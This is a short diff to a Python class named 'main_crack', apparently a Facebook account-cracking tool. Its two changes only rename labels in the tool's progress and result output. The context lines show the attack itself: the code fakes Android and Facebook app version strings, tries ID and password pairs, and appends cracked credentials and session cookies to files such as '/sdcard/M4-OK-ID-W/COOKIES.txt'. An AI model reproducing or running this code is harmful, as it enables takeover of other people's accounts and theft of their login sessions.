@@ -292,7 +292,7 @@ class main_crack():
     def methodA(self, sid, name, psw):
         try:
             global oks,cps,loop
-            sys.stdout.write(f"\r\033[1;32m[\033[1;31mAPOLLO-M1\033[1;32m] \033[1;36m{loop}\033[1;35m \033[1;34m|\033[1;32m OK\033[1;34m|\033[1;31mCP \033[1;32m{len(oks)}\033[1;34m|\033[1;31m{len(cps)} \033[1;34m| \033[1;36m{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
+            sys.stdout.write(f"\r\033[1;32m[\033[1;31mM1\033[1;32m] \033[1;36m{loop}\033[1;35m \033[1;34m|\033[1;32m OK\033[1;34m|\033[1;31mCP \033[1;32m{len(oks)}\033[1;34m|\033[1;31m{len(cps)} \033[1;34m| \033[1;36m{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
             sys.stdout.flush()
             android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
             facebook_version = f'{random.randint(10,432)}.0.0.{random.randint(11,99)}.{random.randint(1,200)}'
@@ -680,7 +680,7 @@ class main_crack():
                     open('/sdcard/M4-OK.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/M4-OK-ID-W/COOKIES.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                     break
                 elif 'www.facebook.com' in q['error']['message']:
-                    print(f"\r{A} [apollo-CP] {sid} | {ps} {S}")
+                    print(f"\r{A} [M4-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/M4-CP.txt','a').write(sid+'|'+ps+'\n')
                 else:
